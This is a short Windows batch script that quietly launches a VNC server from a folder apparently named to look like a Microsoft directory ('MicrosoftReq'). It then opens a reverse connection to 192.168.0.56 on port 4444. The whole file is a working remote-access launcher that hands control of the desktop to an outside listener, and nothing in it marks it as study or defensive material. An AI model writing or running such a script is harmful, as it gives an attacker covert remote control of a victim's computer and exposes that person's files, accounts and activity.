@echo off
start C:\\MicrosoftReq\\data\\winvnc.exe -run
timeout /t 1 >nul
start C:\\MicrosoftReq\\data\\winvnc.exe -connect 192.168.0.56::4444
